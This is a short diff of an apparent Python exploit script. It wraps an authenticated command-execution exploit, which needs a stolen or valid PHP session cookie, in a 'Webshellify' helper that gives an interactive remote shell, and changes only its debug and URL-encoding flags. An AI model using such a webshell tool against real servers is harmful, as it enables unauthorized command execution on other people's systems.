@@ -14,8 +14,8 @@ requires a valid, authorized PHPSSID cookie to be passed into it (either hard
 coded or programatically fetched)
 """
 def main():
-    shell = Webshellify(exploit, debug=True)
-    shell.create_shell(urlencode=True)
+    shell = Webshellify(exploit, debug=False)
+    shell.create_shell(urlencode=False)
 
 def exploit(cmd):
     sess_cookie = get_session()
